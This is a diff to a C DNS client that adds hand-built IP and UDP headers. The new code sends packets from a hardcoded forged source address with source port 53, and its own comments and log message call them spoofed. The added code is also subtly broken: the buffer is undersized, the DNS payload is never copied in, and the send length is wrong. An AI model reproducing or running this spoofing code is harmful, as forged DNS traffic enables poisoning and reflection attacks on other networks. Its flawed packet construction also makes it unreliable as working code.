@@ -5,16 +5,28 @@
 #include <string.h>
 #include <sys/socket.h> //you know what this is for
 #include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
 #include <unistd.h>
 
 #include "../inc/dns_udp.h"
 #include "utils.h"
+
+unsigned short csum(unsigned short *buf, int nwords){
+  unsigned long sum;
+  for (sum = 0; nwords > 0; nwords--)
+    sum += *buf++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return ~sum;
+}
 
 dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qinfo,
     unsigned int to, char *host, char *buf, int query_type, const char *server)
 {
     int s = -1;
     struct sockaddr_in dest = {0};
+    char datagram[sizeof(struct ip)+sizeof(struct udphdr)+sizeof(struct DNS_UDP_HEADER)] = {0};
 
     feel_dns_header_req(&dns->header);
 
@@ -50,15 +62,59 @@ dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qi
         return DNS_RESULT_SOCKET_ERR;
     }
 
-    int len = (unsigned int)sizeof(struct DNS_UDP_HEADER) + (strlen((const char *)qname) + 1) +
-              sizeof(struct QUESTION);
+    int len = (unsigned int)sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);
 
-    if (0 > sendto(s, (char *)buf, len, 0, (struct sockaddr *)&dest, sizeof(dest)))
-    {
-        // printf("sendto failed");
+
+    struct ip *ip_hdr = (struct ip *) datagram;
+    struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
+
+
+    ip_hdr->ip_hl = 5; //header length
+    ip_hdr->ip_v = 4; //version
+    ip_hdr->ip_tos = 0; //tos
+    ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + len;  //length
+    ip_hdr->ip_id = 0; //id
+    ip_hdr->ip_off = 0; //fragment offset
+    ip_hdr->ip_ttl = 255; //ttl
+    ip_hdr->ip_p = 17; //protocol
+    ip_hdr->ip_sum = 0; //temp checksum
+    ip_hdr->ip_src.s_addr = inet_addr ("188.166.88.29"); //src ip - spoofed
+    ip_hdr->ip_dst.s_addr = inet_addr(server); //dst ip
+
+    udp_hdr->source = htons(53);
+    // srand(time(NULL));
+    udp_hdr->dest = rand() % 65536; //dst port
+    udp_hdr->len = htons(sizeof(struct udphdr) + len); //length
+    udp_hdr->check = 0; //checksum - disabled
+
+    ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
+
+
+    // printf("\nSending Packet...");
+    // if( 0 > sendto(s,(char*)buf,len,0,(struct sockaddr*)&dest,sizeof(dest)) )
+    // {
+    //     printf("sendto failed");
+    //     close(s);
+	//     return DNS_RESULT_ERR;
+    // }
+    // printf("Done");
+        /* inform kernel that we have added packet headers */
+
+    int on = 1;
+    if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
+        perror("[-] Error! Cannot set IP_HDRINCL");
+        return -1;
+    }
+
+    /* send spoofed packet (set routing flags to 0) */
+    if(sendto(s, datagram, len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0){
+        printf("sendto failed");
         close(s);
         return DNS_RESULT_SEND_ERR;
     }
+    else
+        printf( "[+] Spoofed IP packet sent successfully!\n");
+
 
     // Receive the answer
     i = sizeof dest;
